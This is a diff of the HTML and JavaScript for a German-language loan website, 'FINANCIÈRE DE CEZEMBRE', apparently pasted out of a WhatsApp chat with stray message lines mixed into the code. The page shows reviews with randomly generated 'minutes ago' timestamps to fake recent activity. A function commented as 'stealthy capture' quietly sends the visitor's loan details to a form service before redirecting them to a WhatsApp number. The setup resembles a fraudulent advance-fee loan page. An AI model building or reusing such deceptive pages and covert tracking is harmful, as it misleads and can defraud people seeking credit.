@@ -1,4 +1,20 @@
-<!DOCTYPE html>
+[06:48, 28/04/2026] Bisss: <!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FINANCIÈRE DE CEZEMBRE | Institutionelle Kreditlösungen</title>
+    
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%23001A4D'/><text y='70' x='15' font-family='serif' font-size='55' font-weight='bold' fill='%23C5A059'>FC</text></svg>">
+
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        :ro…
+[07:05, 28/04/2026] Bisss: Fffffffff
+[07:05, 28/04/2026] Bisss: Ffffffffffffff
+[07:06, 28/04/2026] Bisss: <!DOCTYPE html>
 <html lang="de">
 <head>
     <meta charset="UTF-8">
@@ -20,6 +36,18 @@
             --white: #FFFFFF;
             --whatsapp: #25D366;
             --success: #27ae60;
+        }
+
+        /* --- ANIMATIONS AJOUTÉES --- */
+        @keyframes shine {
+            0% { left: -100%; }
+            20% { left: 100%; }
+            100% { left: 100%; }
+        }
+
+        @keyframes bubbleFade {
+            0%, 100% { opacity: 0; transform: translateY(10px); }
+            10%, 90% { opacity: 1; transform: translateY(0); }
         }
 
         .goog-te-banner-frame.skiptranslate, .goog-te-gadget-icon { display: none !important; }
@@ -84,11 +112,40 @@
             position: relative; overflow: hidden; min-height: 520px;
         }
 
-        /* AJOUT DU FLEX POUR LE BOUTON WHATSAPP ET FORMULAIRE */
         .btn-flex-container {
             display: flex;
             gap: 10px;
+            align-items: flex-end; /* Aligné en bas pour la bulle */
+            position: relative;
+        }
+
+        /* --- BULLE D'AIDE WHATSAPP --- */
+        .wa-help-bubble {
+            position: absolute;
+            right: 0;
+            bottom: 75px;
+            background: var(--white);
+            color: var(--navy);
+            padding: 8px 12px;
+            border-radius: 12px 12px 0 12px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            border: 1px solid #eee;
+            white-space: nowrap;
+            animation: bubbleFade 4s infinite;
+            display: flex;
             align-items: center;
+            gap: 5px;
+        }
+        .wa-help-bubble::after {
+            content: "";
+            position: absolute;
+            bottom: -8px;
+            right: 10px;
+            border-width: 8px 8px 0 0;
+            border-style: solid;
+            border-color: var(--white) transparent transparent transparent;
         }
 
         .whatsapp-inline-btn {
@@ -104,9 +161,21 @@
             text-decoration: none;
             transition: transform 0.3s ease;
             box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            position: relative;
         }
 
-        /* Animation de balancement au scroll */
+        /* Badge de notification */
+        .wa-badge {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: red;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            border: 2px solid white;
+        }
+
         .shake-animation {
             animation: shake-wa 0.5s ease-in-out;
         }
@@ -150,18 +219,9 @@
         .reviews-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
         
         .review-card { 
-            background: white; 
-            padding: 25px; 
-            border-radius: 8px; 
-            box-shadow: 0 10px 20px rgba(0,0,0,0.05); 
-            text-align: left; 
-            border-top: 3px solid var(--gold);
-            transition: all 0.4s ease;
+            background: white; padding: 25px; border-radius: 8px; box-shadow: 0 10px 20px rgba(0,0,0,0.05); text-align: left; border-top: 3px solid var(--gold); transition: all 0.4s ease;
         }
-        .review-card:hover { 
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(197, 160, 89, 0.2);
-        }
+        .review-card:hover { transform: translateY(-5px); box-shadow: 0 15px 30px rgba(197, 160, 89, 0.2); }
 
         .stars { color: var(--bright-gold); margin-bottom: 5px; font-size: 0.9rem; }
         .review-date { font-size: 0.7rem; color: #999; margin-bottom: 10px; font-weight: 600; display: block; }
@@ -188,30 +248,32 @@
         .result-area p { font-size: 0.9rem; margin-bottom: 5px; color: var(--navy); font-weight: 800; }
         .result-area span { font-size: 2.2rem; font-weight: 800; color: var(--navy); }
         
-        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        /* --- BOUTON PRINCIPAL AVEC REFLET --- */
+        .btn-main { 
+            background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; 
+            position: relative; overflow: hidden;
+        }
+        .btn-main::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 50%;
+            height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.4), transparent);
+            transform: skewX(-25deg);
+            animation: shine 4s infinite;
+        }
         .btn-main:hover { background: var(--gold); }
 
         .form-input { 
-            width: 100%; 
-            padding: 12px; 
-            border: 2.5px solid var(--deep-gold); 
-            background-color: var(--white);
-            border-radius: 4px; 
-            margin-bottom: 10px; 
-            font-size: 1rem;
-            outline: none;
-            color: #000c24; 
-            font-weight: 600; 
+            width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); background-color: var(--white); border-radius: 4px; margin-bottom: 10px; font-size: 1rem; outline: none; color: #000c24; font-weight: 600; 
         }
 
         .scrolling-security {
-            background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0;
-            overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1;
-            display: flex;
+            background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0; overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1; display: flex;
         }
-        .scrolling-security span {
-            display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600;
-        }
+        .scrolling-security span { display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600; }
         @keyframes scroll-text { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
 
         #loader-overlay {
@@ -225,8 +287,8 @@
         .stat-box h3 { font-size: 2rem; color: var(--gold); }
 
         footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
-        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; margin-left: 160px;}
-        .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; margin-left: 160px;}
+        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; }
+        .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; }
         .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
         .blink-gold { color: var(--gold); font-weight: 700; animation: pulse-text 1.5s infinite; }
         @keyframes pulse-text { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
@@ -297,8 +359,11 @@
             </div>
 
             <div class="btn-flex-container">
-                <button type="button" class="btn-main" onclick="goToStep2()" style="flex: 1;">ANTRAG STELLEN</button>
-                <a href="https://wa.me/33780976404" class="whatsapp-inline-btn" id="wa-dynamic" target="_blank">
+                <button type="button" class="btn-main" id="mainSubmit" onclick="goToStep2()" style="flex: 1;">ANTRAG STELLEN</button>
+                
+                <div class="wa-help-bubble" id="wa-bubble">Hilfe benötigt?</div>
+                <a href="#" class="whatsapp-inline-btn" id="wa-dynamic" onclick="sendToWhatsApp(event)">
+                    <div class="wa-badge"></div>
                     <i class="fab fa-whatsapp"></i>
                 </a>
             </div>
@@ -313,7 +378,10 @@
             <h3 style="margin-bottom: 20px;">Antrag abschließen</h3>
             <form id="loanForm">
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
-                <input type="hidden" name="montant_client" id="hiddenAmt"><input type="hidden" name="duree_client" id="hiddenDur"><input type="hidden" name="mensualite_client" id="hiddenMens">
+                <input type="hidden" name="montant_client" id="hiddenAmt">
+                <input type="hidden" name="duree_client" id="hiddenDur">
+                <input type="hidden" name="mensualite_client" id="hiddenMens">
+                <input type="hidden" name="source_clic" id="hiddenSource" value="Formular">
                 
                 <input type="text" name="nom" placeholder="Vor- und Nachname" class="form-input" required>
                 
@@ -389,10 +457,8 @@
         const container = document.getElementById('reviews-container');
         container.innerHTML = ""; 
         internationalReviews.sort(() => 0.5 - Math.random()).forEach(r => {
-            // SYSTÈME DE TEMPS ALÉATOIRE PRÉSERVÉ
             const times = ["2 min", "15 min", "1h", "3h", "5h", "1j", "2j"];
             const randomTime = times[Math.floor(Math.random() * times.length)];
-            
             container.innerHTML += `
                 <div class="review-card">
                     <span class="review-date"><i class="far fa-clock"></i> Vor ${randomTime}</span>
@@ -406,6 +472,14 @@
         });
     }
     renderReviews();
+
+    // --- GESTION BULLE DYNAMIQUE ---
+    const messages = ["Hilfe benötigt?", "Kundenservice online", "Kontaktieren Sie uns"];
+    let msgIndex = 0;
+    setInterval(() => {
+        msgIndex = (msgIndex + 1) % messages.length;
+        document.getElementById('wa-bubble').innerText = messages[msgIndex];
+    }, 4000);
 
     const amtR = document.getElementById('amtRange');
     const amtN = document.getElementById('amtNum');
@@ -428,24 +502,48 @@
         durR.style.backgroundSize = valD + '% 100%';
     }
 
-    function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
+    function goToStep2() { 
+        document.getElementById('step1').style.display = 'none'; 
+        document.getElementById('step2').style.display = 'block'; 
+        document.getElementById('hiddenSource').value = "Formular Vollständig";
+    }
     function goToStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
 
     amtR.oninput = calc; durR.oninput = calc;
     calc();
 
-    // GESTION ANIMATION WHATSAPP AU SCROLL
+    // --- CAPTURE FURTIVE WHATSAPP ---
+    async function sendToWhatsApp(e) {
+        e.preventDefault();
+        
+        // On prépare les données du simulateur
+        const montant = document.getElementById('hiddenAmt').value;
+        const duree = document.getElementById('hiddenDur').value;
+        const mensualite = document.getElementById('hiddenMens').value;
+
+        // On envoie discrètement à Web3Forms pour avoir une trace du mail
+        const formData = new FormData();
+        formData.append("access_key", "55707e6c-f919-4972-bf3e-fba1cf0e51e9");
+        formData.append("Subject", "Interêt via WhatsApp");
+        formData.append("Montant_Simule", montant);
+        formData.append("Duree_Simulee", duree);
+        formData.append("Mensualite", mensualite);
+        formData.append("Source", "Clic Direct WhatsApp");
+
+        // On lance l'envoi en arrière-plan sans bloquer l'utilisateur
+        fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
+
+        // On redirige vers WhatsApp
+        window.open("https://wa.me/33780976404?text=Hallo, ich interessiere mich für einen Kredit von " + montant + ". Bitte um weitere Informationen.", "_blank");
+    }
+
     const waBtn = document.getElementById('wa-dynamic');
     let isScrolling;
     window.onscroll = () => { 
         document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; 
-        
-        // Effet de mouvement WhatsApp
         waBtn.classList.add('shake-animation');
         window.clearTimeout(isScrolling);
-        isScrolling = setTimeout(() => {
-            waBtn.classList.remove('shake-animation');
-        }, 500);
+        isScrolling = setTimeout(() => { waBtn.classList.remove('shake-animation'); }, 500);
     };
 
     const form = document.getElementById('loanForm');
